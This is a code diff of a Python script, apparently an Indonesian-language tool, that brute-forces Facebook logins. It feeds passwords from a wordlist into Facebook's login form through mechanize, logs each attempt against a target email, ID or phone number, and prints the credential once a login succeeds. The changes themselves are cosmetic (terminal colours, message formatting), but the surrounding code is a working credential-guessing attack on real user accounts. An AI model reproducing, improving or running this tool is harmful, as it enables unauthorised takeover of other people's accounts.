@@ -57,7 +57,7 @@ except AttributeError:
 def run(email, wordlist, agent, timeout):
 	now = time.strftime("%X")
 	print (LEGAL_DISCLAIMER)
-	print ("\n[*] starting at %s\n\n" % now)
+	print ("\n[*] starting at %s\n" % now)
 	url = "https://www.facebook.com/login.php?login_attempt=1"
 	regexp = re.compile(re.findall("/(.*)\?", url)[0])
 	cj = mechanize.LWPCookieJar()
@@ -72,8 +72,10 @@ def run(email, wordlist, agent, timeout):
 	br.open(url, timeout=timeout)
 	form = br.forms()[0]
 	wordlist = open(wordlist, "rb").readlines()
+	print ("\033[01;34m")
 	msg = "target: " + email; logger.info(msg)
 	msg = "wordlist: %d password" % len(wordlist); logger.info(msg)
+	print ("\033[0m")
 	while len(wordlist) <> 0:
 		password = wordlist.pop(0).strip()
 		msg = "trying credential => {0}:{1}".format(email, password); logger.info(msg)
@@ -82,18 +84,20 @@ def run(email, wordlist, agent, timeout):
 		response = br.open(form.click(), timeout=timeout)
 		_url = response.geturl()
 		if not regexp.search(_url) or regexp.pattern not in _url:
-			msg = "valid credential: " + "-" * len(email); logger.info(msg)
-			msg = "        email|id: " + email; logger.debug(msg)
-			msg = "        password: " + password; logger.debug(msg)
+			print ("\033[01;32m")
+			msg = "valid credential: "; logger.info(msg)
+			msg = "email|id: " + email; logger.debug(msg)
+			msg = "password: " + password; logger.debug(msg)
+			print ("\033[0m")
 			raise SystemExit
 
 def main():
 	print (BANNER)
 	parser = optparse.OptionParser(version=__version__+"#dev")
 	try:
-		parser.add_option("-t", "--target", dest="accountTarget", metavar="<target>", help="Target bisa berupa (EM)ail, (ID) or (Phone Number)")
-		parser.add_option("-w", "--wordlist", dest="wordList", metavar="<file>", help="File wordlist untuk mencari password target")
-		parser.add_option("--timeout", dest="timeout", metavar="<sec>", type="float", help="Waktu sebelum koneksi dimulai (default: 30)", default=30)
+		parser.add_option("-t", "--target", dest="accountTarget", metavar="<target>", help="target bisa berupa (EM)ail, (ID) or (Phone Number)")
+		parser.add_option("-w", "--wordlist", dest="wordList", metavar="<file>", help="file wordlist untuk mencari password target")
+		parser.add_option("--timeout", dest="timeout", metavar="<sec>", type="float", help="waktu sebelum koneksi dimulai (default: 30)", default=30)
 		parser.add_option("--user-agent", dest="agent", metavar="<agent>", help="HTTP user-agent header value (default: \"Mozilla 0.5\")", default="Mozilla 0.5")
 
 		(args, _) = parser.parse_args()
@@ -125,7 +129,7 @@ def main():
 
 		finally:
 			try:
-				print ("\n[-] shutting down at %s\n\n" % now)
+				print ("\n[-] shutting down at %s\n\n" % time.strftime("%X"))
 			except:
 				pass
 			return;
